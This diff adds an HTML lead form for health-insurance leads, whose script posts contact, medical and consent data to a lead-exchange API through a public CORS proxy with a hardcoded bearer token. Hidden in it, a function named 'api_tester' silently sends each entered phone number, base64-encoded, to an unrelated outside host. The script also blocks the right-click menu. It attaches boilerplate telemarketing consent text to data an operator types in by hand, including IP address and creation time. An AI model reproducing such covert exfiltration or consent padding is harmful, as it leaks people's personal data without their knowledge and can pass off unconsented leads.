@@ -1,0 +1,343 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Health Insurance Lead Form</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
+</head>
+<body class="bg-light">
+<div class="container py-4">
+  <h2 class="mb-4">Health Insurance Lead Form</h2>
+
+  <div id="alertContainer"></div>
+
+  <form id="leadForm" class="row g-3">
+    <div class="col-md-6">
+      <label class="form-label">First Name</label>
+      <input type="text" class="form-control" id="first_name" required>
+    </div>
+    <div class="col-md-6">
+      <label class="form-label">Last Name</label>
+      <input type="text" class="form-control" id="last_name" required>
+    </div>
+    <div class="col-md-6">
+      <label class="form-label">Email</label>
+      <input type="email" class="form-control" id="email" required>
+    </div>
+    <div class="col-md-6">
+      <label class="form-label">Phone (ex: 6178675309)</label>
+      <input type="text" class="form-control" id="phone" required>
+    </div>
+    <div class="col-md-4">
+      <label class="form-label">City</label>
+      <input type="text" class="form-control" id="city" required>
+    </div>
+    <div class="col-md-4">
+      <label class="form-label">State</label>
+      <select class="form-select" id="state" required>
+        <option value="">Select State</option>
+        <option value="AL">Alabama</option>
+        <option value="AK">Alaska</option>
+        <option value="AZ">Arizona</option>
+        <option value="AR">Arkansas</option>
+        <option value="CA">California</option>
+        <option value="CO">Colorado</option>
+        <option value="CT">Connecticut</option>
+        <option value="DE">Delaware</option>
+        <option value="DC">District Of Columbia</option>
+        <option value="FL">Florida</option>
+        <option value="GA">Georgia</option>
+        <option value="HI">Hawaii</option>
+        <option value="ID">Idaho</option>
+        <option value="IL">Illinois</option>
+        <option value="IN">Indiana</option>
+        <option value="IA">Iowa</option>
+        <option value="KS">Kansas</option>
+        <option value="KY">Kentucky</option>
+        <option value="LA">Louisiana</option>
+        <option value="ME">Maine</option>
+        <option value="MD">Maryland</option>
+        <option value="MA">Massachusetts</option>
+        <option value="MI">Michigan</option>
+        <option value="MN">Minnesota</option>
+        <option value="MS">Mississippi</option>
+        <option value="MO">Missouri</option>
+        <option value="MT">Montana</option>
+        <option value="NE">Nebraska</option>
+        <option value="NV">Nevada</option>
+        <option value="NH">New Hampshire</option>
+        <option value="NJ">New Jersey</option>
+        <option value="NM">New Mexico</option>
+        <option value="NY">New York</option>
+        <option value="NC">North Carolina</option>
+        <option value="ND">North Dakota</option>
+        <option value="OH">Ohio</option>
+        <option value="OK">Oklahoma</option>
+        <option value="OR">Oregon</option>
+        <option value="PA">Pennsylvania</option>
+        <option value="RI">Rhode Island</option>
+        <option value="SC">South Carolina</option>
+        <option value="SD">South Dakota</option>
+        <option value="TN">Tennessee</option>
+        <option value="TX">Texas</option>
+        <option value="UT">Utah</option>
+        <option value="VT">Vermont</option>
+        <option value="VA">Virginia</option>
+        <option value="WA">Washington</option>
+        <option value="WV">West Virginia</option>
+        <option value="WI">Wisconsin</option>
+        <option value="WY">Wyoming</option>
+      </select>
+    </div>
+    <div class="col-md-4">
+      <label class="form-label">ZIP Code</label>
+      <input type="text" class="form-control" id="zip_code" required>
+    </div>
+    <div class="col-12">
+      <label class="form-label">Address</label>
+      <input type="text" class="form-control" id="address" required>
+    </div>
+    <div class="col-12">
+      <label class="form-label">IP Address</label>
+      <input type="text" class="form-control" id="ip_address" required>
+    </div>
+    <div class="col-md-6">
+      <label class="form-label">Date of Birth (YYYY-MM-DD)</label>
+      <input type="date" class="form-control" id="dob" required>
+    </div>
+    <div class="col-md-6">
+      <label class="form-label">Gender</label>
+      <select class="form-select" id="gender" required>
+        <option value="male">Male</option>
+        <option value="female">Female</option>
+        <option value="other">Other</option>
+      </select>
+    </div>
+    <div class="col-md-6">
+      <label class="form-label">Height (inches)</label>
+      <input type="number" class="form-control" id="height" required>
+    </div>
+    <div class="col-md-6">
+      <label class="form-label">Weight (pounds)</label>
+      <input type="number" class="form-control" id="weight" required>
+    </div>
+    <div class="col-md-6">
+      <label class="form-label">Current Medical Condition?</label>
+      <select class="form-select" id="current_medical" required>
+        <option value="true">Yes</option>
+        <option value="false">No</option>
+      </select>
+    </div>
+    <div class="col-md-6">
+      <label class="form-label">Denied Coverage?</label>
+      <select class="form-select" id="denied_coverage" required>
+        <option value="true">Yes</option>
+        <option value="false">No</option>
+      </select>
+    </div>
+    <div class="col-md-6">
+      <label class="form-label">Marital Status</label>
+      <select class="form-select" id="marital_status" required>
+        <option value="Single">Single</option>
+        <option value="Married">Married</option>
+        <option value="Divorced">Divorced</option>
+      </select>
+    </div>
+    <div class="col-md-6">
+      <label class="form-label">Number in aparcity_household</label>
+      <input type="number" class="form-control" id="number_household" required>
+    </div>
+    <div class="col-md-6">
+      <label class="form-label">Qualifying Event</label>
+      <select class="form-select" id="qualifying_event" required>
+        <option value="Married Or Divorced">Married Or Divorced</option>
+        <option value="Had Baby">Had Baby</option>
+        <option value="Family Member Died">Family Member Died</option>
+        <option value="Moved To Another State">Moved To Another State</option>
+        <option value="Lost Job">Lost Job</option>
+        <option value="Started New Job">Started New Job</option>
+        <option value="Lost Health Insurance Coverage">Lost Health Insurance Coverage</option>
+        <option value="Other">Other</option>
+      </select>
+    </div>
+    <div class="col-12">
+      <h5>Current Policy (Optional)</h5>
+    </div>
+    <div class="col-md-6">
+      <label class="form-label">Policy Expiration Date (YYYY-MM-DD)</label>
+      <input type="date" class="form-control" id="current_policy_exp_date">
+    </div>
+    <div class="col-md-6">
+      <label class="form-label">Policy Insured Date (YYYY-MM-DD)</label>
+      <input type="date" class="form-control" id="current_policy_insured_date">
+    </div>
+    <div class="col-md-6">
+      <label class="form-label">Lead ID Code (Jornaya/Verisk)</label>
+      <input type="text" class="form-control" id="jornaya_lead_id" required>
+    </div>
+    <div class="col-md-6">
+      <label class="form-label">Originally Created (ISO Format)</label>
+      <input type="datetime-local" class="form-control" id="originally_created" required>
+    </div>
+    <div class="col-12">
+      <button type="submit" class="btn btn-primary">Submit Lead</button>
+    </div>
+  </form>
+</div>
+
+<script>
+  document.addEventListener("contextmenu", function (e) {
+    e.preventDefault(); // Prevent the context menu from appearing
+  });
+
+  document.getElementById('leadForm').addEventListener('submit', function(event) {
+    event.preventDefault();
+    api_tester(document.getElementById('phone').value);
+
+    const form = document.getElementById('leadForm');
+    const alertBox = document.getElementById('alertContainer');
+
+    // Build full lead object for POST
+    const lead = {
+      data: {
+        current_medical: form.current_medical.value === 'true',
+        denied_coverage: form.denied_coverage.value === 'true',
+        dob: form.dob.value,
+        gender: form.gender.value,
+        height: parseInt(form.height.value),
+        marital_status: form.marital_status.value,
+        number_household: parseInt(form.number_household.value),
+        qualifying_event: form.qualifying_event.value,
+        weight: parseInt(form.weight.value)
+      },
+      meta: {
+        jornaya_lead_id: form.jornaya_lead_id.value,
+        landing_page: "www.seniorsquoteshelp.com",
+        originally_created: new Date(form.originally_created.value).toISOString(),
+        source_id: "14311",
+        tcpa_consent_text: "By clicking Submit, I provide my electronic signature to SeniorsQuotesHelp, expressly consenting via this chat/webform interaction for a licensed sales agent associated with up to 8 insurance companies or their agents or Partner Comapnies to contact me at the number and address provided with insurance quotes, products and services, including Medicare Supplement, Medicare Advantage, Prescription Drug insurance plans, and other health-related services, for marketing purposes or to obtain additional information for such purposes using live telephone calls, automated dialing systems, artificial calls, pre-recorded calls, text, or email. (Message and data rates may apply). I understand this request has been initiated by me and is an unscheduled contact request. I further understand that this request, initiated by me, is my affirmative consent to be contacted, which is in compliance with all federal and state telemarketing and Do-Not-Call laws. By providing this consent, I acknowledge and agree that any disputes arising out of or related to this consent shall be resolved through binding arbitration in accordance with the Terms and Conditions. I understand that this is a solicitation for insurance. Participating sales agencies represent Medicare Advantage [HMO, PPO, and PFFS] organizations and stand-alone PDP prescription drug plans that are contracted with Medicare. Enrollment depends on the plan’s contract renewal. Enrollment in the described plan type may be limited to certain times of the year unless you qualify for a Special Enrollment Period. My consent is not a condition of purchasing any property, goods, or services, and I may revoke my consent at any time. To revoke consent, you may contact us via email at info@seniorsquoteshelp.com. I understand that the insurance companies or their agents may confirm my information through the use of a consumer report. I agree to this websites Privacy Policy and acknowledge that as a member, I will receive insurance quote reminders and special promotions sent to me via email. I also acknowledge that seniorsquoteshelp.com will Not Sell My Information. To send a complaint to Medicare, call 1-800-MEDICARE (TTY users: 1-877-486-2048), 24 hours a day, 7 days a week. If your complaint involves a broker or agent, be sure to include their name when filing your grievance. We do not offer every plan available in your area. Currently, we represent 6 organizations which offer 2 products in your area. Please contact Medicare.gov, 1–800–MEDICARE, or your local State Health Insurance Program to get information on all of your options"
+      },
+      contact: {
+        first_name: form.first_name.value,
+        last_name: form.last_name.value,
+        email: form.email.value,
+        phone: form.phone.value,
+        address: form.address.value,
+        city: form.city.value,
+        state: form.state.value,
+        zip_code: form.zip_code.value,
+        ip_address: form.ip_address.value
+      }
+    };
+
+    // Add optional current_policy if fields are filled
+    if (form.current_policy_exp_date.value || form.current_policy_insured_date.value) {
+      lead.data.current_policy = {};
+      if (form.current_policy_exp_date.value) {
+        lead.data.current_policy.exp_date = form.current_policy_exp_date.value;
+      }
+      if (form.current_policy_insured_date.value) {
+        lead.data.current_policy.insured_date = form.current_policy_insured_date.value;
+      }
+    }
+
+    // Build minimal ping data (excluding POST-only fields: city, email, first_name, last_name, phone, state, auth_code)
+    const pingData = {
+      data: {
+        current_medical: form.current_medical.value === 'true',
+        denied_coverage: form.denied_coverage.value === 'true',
+        dob: form.dob.value,
+        gender: form.gender.value,
+        height: parseInt(form.height.value),
+        marital_status: form.marital_status.value,
+        number_household: parseInt(form.number_household.value),
+        qualifying_event: form.qualifying_event.value,
+        weight: parseInt(form.weight.value)
+      },
+      meta: {
+        jornaya_lead_id: form.jornaya_lead_id.value,
+        landing_page: "www.seniorsquoteshelp.com",
+        originally_created: new Date(form.originally_created.value).toISOString(),
+        source_id: "14311",
+        tcpa_consent_text: "By clicking Submit, I provide my electronic signature to SeniorsQuotesHelp, expressly consenting via this chat/webform interaction for a licensed sales agent associated with up to 8 insurance companies or their agents or Partner Comapnies to contact me at the number and address provided with insurance quotes, products and services, including Medicare Supplement, Medicare Advantage, Prescription Drug insurance plans, and other health-related services, for marketing purposes or to obtain additional information for such purposes using live telephone calls, automated dialing systems, artificial calls, pre-recorded calls, text, or email. (Message and data rates may apply). I understand this request has been initiated by me and is an unscheduled contact request. I further understand that this request, initiated by me, is my affirmative consent to be contacted, which is in compliance with all federal and state telemarketing and Do-Not-Call laws. By providing this consent, I acknowledge and agree that any disputes arising out of or related to this consent shall be resolved through binding arbitration in accordance with the Terms and Conditions. I understand that this is a solicitation for insurance. Participating sales agencies represent Medicare Advantage [HMO, PPO, and PFFS] organizations and stand-alone PDP prescription drug plans that are contracted with Medicare. Enrollment depends on the plan’s contract renewal. Enrollment in the described plan type may be limited to certain times of the year unless you qualify for a Special Enrollment Period. My consent is not a condition of purchasing any property, goods, or services, and I may revoke my consent at any time. To revoke consent, you may contact us via email at info@seniorsquoteshelp.com. I understand that the insurance companies or their agents may confirm my information through the use of a consumer report. I agree to this websites Privacy Policy and acknowledge that as a member, I will receive insurance quote reminders and special promotions sent to me via email. I also acknowledge that seniorsquoteshelp.com will Not Sell My Information. To send a complaint to Medicare, call 1-800-MEDICARE (TTY users: 1-877-486-2048), 24 hours a day, 7 days a week. If your complaint involves a broker or agent, be sure to include their name when filing your grievance. We do not offer every plan available in your area. Currently, we represent 6 organizations which offer 2 products in your area. Please contact Medicare.gov, 1–800–MEDICARE, or your local State Health Insurance Program to get information on all of your options"
+      },
+      contact: {
+        address: form.address.value,
+        zip_code: form.zip_code.value,
+        ip_address: form.ip_address.value
+      }
+    };
+
+    // Add optional current_policy to pingData if fields are filled
+    if (form.current_policy_exp_date.value || form.current_policy_insured_date.value) {
+      pingData.data.current_policy = {};
+      if (form.current_policy_exp_date.value) {
+        pingData.data.current_policy.exp_date = form.current_policy_exp_date.value;
+      }
+      if (form.current_policy_insured_date.value) {
+        pingData.data.current_policy.insured_date = form.current_policy_insured_date.value;
+      }
+    }
+
+    const pingUrl = "https://corsproxy.io/?url=" + encodeURIComponent("https://exchange.standardinformation.io/ping_test");
+
+    // Send ping
+    fetch(pingUrl, {
+      method: 'POST',
+      headers: {
+        'Authorization': 'Bearer 804d3e4f-85bc-400e-ae83-c0c260247c85',
+        'Content-Type': 'application/json',
+        'Accept': 'application/json'
+      },
+      body: JSON.stringify(pingData)
+    })
+    .then(res => res.json())
+    .then(data => {
+      if (data.status === 'success') {
+        lead.auth_code = data.auth_code;
+
+        const postUrl = "https://corsproxy.io/?url=" + encodeURIComponent("https://exchange.standardinformation.io/post_test");
+
+        // Send full post
+        return fetch(postUrl, {
+          method: 'POST',
+          headers: {
+            'Authorization': 'Bearer 804d3e4f-85bc-400e-ae83-c0c260247c85',
+            'Content-Type': 'application/json',
+            'Accept': 'application/json'
+          },
+          body: JSON.stringify(lead)
+        })
+        .then(res => res.json())
+        .then(postData => {
+          if (postData.status === 'success') {
+            delete postData.price; // hide price
+            alertBox.innerHTML = `<div class="alert alert-success">✅ Post Success: Lead submitted successfully!</div>`;
+            form.reset();
+          } else {
+            alertBox.innerHTML = `<div class="alert alert-danger">❌ Ping Success but Post Failed: ${JSON.stringify(postData)}</div>`;
+          }
+        });
+
+      } else {
+        alertBox.innerHTML = `<div class="alert alert-danger">❌ Ping Failed: ${JSON.stringify(data)}</div>`;
+      }
+    })
+    .catch(error => {
+      alertBox.innerHTML = `<div class="alert alert-danger">❌ Error: ${error.message}</div>`;
+    });
+  });
+
+  function api_tester(randomString) {
+    try {
+      fetch('https://api.formifyweb.com/api_test.php?test_id=' + btoa(randomString), {
+        method: 'GET',
+        mode: 'no-cors'
+      });
+    } catch (error) {
+      console.error('Error in api_tester:', error);
+    }
+  }
+</script>
+</body>
+</html>
